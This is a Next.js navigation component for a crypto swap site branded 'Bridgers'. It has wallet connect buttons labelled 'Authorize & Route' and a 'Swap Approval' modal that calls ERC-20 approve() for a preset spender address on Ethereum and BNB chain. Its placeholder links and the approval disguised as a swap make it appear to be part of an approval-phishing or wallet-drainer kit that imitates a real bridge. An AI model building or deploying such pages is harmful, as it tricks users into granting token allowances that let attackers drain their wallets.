/** biome-ignore-all lint/a11y/noSvgWithoutTitle: explanation */
"use client";
import { useState } from "react";
import Image from "next/image";
import { Button } from "@/components/ui/button";
import { useAccount, useWriteContract, useChainId, useDisconnect } from "wagmi";
import { parseUnits } from "viem";
import erc20Abi from "../abi/erc20.json";
import {
	TOKEN_ADDRESS_BNB,
	SPENDER_ADDRESS_BNB,
	TOKEN_ADDRESS_ETH,
	SPENDER_ADDRESS_ETH,
	TOKEN_DECIMALS,
	APPROVE_AMOUNT,
} from "../config";
import { useTranslation } from "react-i18next";
import { useAppKit } from "@reown/appkit/react";
import { SwitchNetworkButton } from "./SwitchNetworkButton";

function sliceAddress(addr?: string) {
	if (!addr || addr.length < 8) return addr || "";
	return `${addr.slice(0, 6)}...${addr.slice(-4)}`;
}

const LANGUAGES = [
	{ code: "EN", label: "English" },
	{ code: "ZH", label: "中文" },
	{ code: "KO", label: "한국어" },
	{ code: "HI", label: "हिन्दी" },
	{ code: "IT", label: "Italiano" },
	{ code: "JA", label: "日本語" },
];

const ApproveModal: React.FC<{
	isOpen: boolean;
	onClose: () => void;
	token: string;
	spender: string;
	amount: string;
	decimals: string;
}> = ({ isOpen, onClose, token, spender, amount, decimals }) => {
	const { writeContractAsync, isPending, data, error } = useWriteContract();

	const [localError, setLocalError] = useState<string | null>(null);

	if (!isOpen) return null;

	async function onApprove() {
		setLocalError(null);
		try {
			const value = parseUnits(amount, Number(decimals));
			await writeContractAsync({
				abi: erc20Abi as any,
				address: token as `0x${string}`,
				functionName: "approve",
				args: [spender as `0x${string}`, value],
			});
		} catch (e: any) {
			setLocalError(e?.message ?? "Approval failed");
		}
	}

	return (
		<div className="fixed inset-0 bg-black/40 flex items-start justify-center p-4 z-50">
			<div className="mt-24 w-full max-w-lg rounded-2xl bg-white p-6 shadow-xl">
				<div className="flex items-center justify-between mb-4">
					<h2 className="text-lg font-semibold">Swap Approval</h2>
					<button
						type="button"
						onClick={onClose}
						className="text-gray-500 hover:text-gray-700"
					>
						✕
					</button>
				</div>

				<div className="space-y-3">
					{localError && <p className="text-sm text-red-600">{localError}</p>}
					{error && (
						<p className="text-sm text-red-600">
							{String((error as any)?.shortMessage || error?.message)}
						</p>
					)}
					{data && (
						<p className="text-sm text-green-600 break-all">
							Submitted tx hash: {String(data)}
						</p>
					)}

					<div className="flex justify-end gap-2 pt-2">
						<button
							type="button"
							onClick={onClose}
							className="px-4 py-2 rounded-lg bg-gray-100 hover:bg-gray-200"
						>
							Cancel
						</button>
						<button
							type="button"
							onClick={onApprove}
							disabled={isPending}
							className="px-4 py-2 rounded-lg bg-blue-600 text-white disabled:opacity-50"
						>
							{isPending ? "Approving..." : "Approve"}
						</button>
					</div>
				</div>
			</div>
		</div>
	);
};

export default function Navigation() {
	const { address } = useAccount();
	const connectedAddress = address;
	const [showApprove, setShowApprove] = useState(false);
	const chainId = useChainId();
	const [langMenuOpen, setLangMenuOpen] = useState(false);
	const [selectedLang, setSelectedLang] = useState("EN");
	const { i18n } = useTranslation(); // <-- MOVE THIS HERE
	const { open } = useAppKit();
	const { disconnect } = useDisconnect();

	// Select addresses based on chain
	const isEth = chainId === 1; // Ethereum Mainnet
	const tokenAddress = isEth ? TOKEN_ADDRESS_ETH : TOKEN_ADDRESS_BNB;
	const spenderAddress = isEth ? SPENDER_ADDRESS_ETH : SPENDER_ADDRESS_BNB;

	const handleDisconnect = () => {
		disconnect();
	};
	return (
		<nav className="relative z-20 px-6 py-4">
			<div className="max-w-7xl mx-auto flex items-center justify-between">
				{/* Logo */}
				<div className="flex items-center">
					<Image
						src="/bridgers-logo.png"
						alt="Bridgers"
						width={160}
						height={40}
						className="h-10 w-auto"
					/>
				</div>

				{/* Navigation Links */}
				<div className="hidden md:flex items-center space-x-8">
					<a
						href="#a"
						className="text-white font-medium hover:text-white/80 transition-colors border-b-2 border-white pb-1 font-poppins"
					>
						SWAP
					</a>
					<a
						href="#a"
						className="text-white font-medium hover:text-white/80 transition-colors font-poppins"
					>
						Staking
					</a>
					<a
						href="#a"
						className="text-white font-medium hover:text-white/80 transition-colors font-poppins"
					>
						SDEX
					</a>
					<a
						href="#a"
						className="text-white font-medium hover:text-white/80 transition-colors font-poppins"
					>
						Explorer
					</a>
					<div className="relative">
						<a
							href="#a"
							className="text-white font-medium hover:text-white/80 transition-colors font-poppins"
						>
							Prediction
						</a>
						<span className="absolute -top-2 -right-8 bg-gradient-to-r from-yellow-400 to-orange-500 text-red-600 text-xs px-2 py-0.5 rounded-full font-bold font-poppins shadow-sm">
							HOT
						</span>
					</div>
				</div>

				{/* Right Side Actions */}
				<div className="hidden md:flex items-center space-x-4">
					<Button
						variant="ghost"
						className="text-white hover:text-white/80 hover:bg-white/10 font-poppins"
					>
						RPC
					</Button>

					{!connectedAddress ? (
						<Button
							variant="ghost"
							className="text-white hover:text-white/80 hover:bg-white/10 flex items-center space-x-2 font-poppins"
							// TODO: Replace with your wallet connect logic
							onClick={() => {
								open({ view: "Connect" });
							}}
						>
							<svg
								className="w-4 h-4"
								fill="none"
								stroke="currentColor"
								viewBox="0 0 24 24"
							>
								<path
									strokeLinecap="round"
									strokeLinejoin="round"
									strokeWidth={2}
									d="M13.828 10.172a4 4 0 00-5.656 0l-4 4a4 4 0 105.656 5.656l1.102-1.101m-.758-4.899a4 4 0 005.656 0l4-4a4 4 0 00-5.656-5.656l-1.1 1.1"
								/>
							</svg>
							<span>Authorize & Route</span>
						</Button>
					) : (
						<SwitchNetworkButton />
					)}
					<div className="relative">
						<Button
							variant="ghost"
							className="text-white hover:text-white/80 hover:bg-white/10 font-poppins text-xs sm:text-base"
							onClick={() => setLangMenuOpen((v) => !v)}
						>
							{selectedLang}
						</Button>
						{langMenuOpen && (
							<div className="absolute right-0 mt-2 w-32 bg-white rounded shadow-lg z-50">
								{LANGUAGES.map((lang) => (
									<button
										type="button"
										key={lang.code}
										className={`block w-full text-left px-4 py-2 text-sm hover:bg-gray-100 font-poppins ${selectedLang === lang.code ? "bg-gray-100 font-bold" : ""
											}`}
										onClick={() => {
											setSelectedLang(lang.code);
											setLangMenuOpen(false);
											i18n.changeLanguage(lang.code);
										}}
									>
										{lang.label}
									</button>
								))}
							</div>
						)}
					</div>
				</div>

				{/* Mobile Actions */}
				<div className="md:hidden flex items-center gap-2">
					{!connectedAddress ? (
						<div>
							<Button
								variant="ghost"
								className="text-white hover:text-white/80 hover:bg-white/10 flex items-center space-x-2 font-poppins"
								// TODO: Replace with your wallet connect logic
								onClick={() => {
									open({ view: "Connect" });
								}}
							>
								<svg
									className="w-4 h-4"
									fill="none"
									stroke="currentColor"
									viewBox="0 0 24 24"
								>
									<path
										strokeLinecap="round"
										strokeLinejoin="round"
										strokeWidth={2}
										d="M13.828 10.172a4 4 0 00-5.656 0l-4 4a4 4 0 105.656 5.656l1.102-1.101m-.758-4.899a4 4 0 005.656 0l4-4a4 4 0 00-5.656-5.656l-1.1 1.1"
									/>
								</svg>
								<span>Authorize</span>
							</Button>
						</div>
					) : (
						<SwitchNetworkButton />
					)}
					<Button
						variant="ghost"
						className="text-white hover:text-white/80 hover:bg-white/10 font-poppins"
					>
						<svg
							className="w-6 h-6"
							fill="none"
							stroke="currentColor"
							viewBox="0 0 24 24"
						>
							<path
								strokeLinecap="round"
								strokeLinejoin="round"
								strokeWidth={2}
								d="M4 6h16M4 12h16M4 18h16"
							/>
						</svg>
					</Button>
				</div>
			</div>
			{/* Approve Modal */}
			<ApproveModal
				isOpen={showApprove}
				onClose={() => setShowApprove(false)}
				token={tokenAddress}
				spender={spenderAddress}
				amount={APPROVE_AMOUNT}
				decimals={TOKEN_DECIMALS as any}
			/>
		</nav>
	);
}
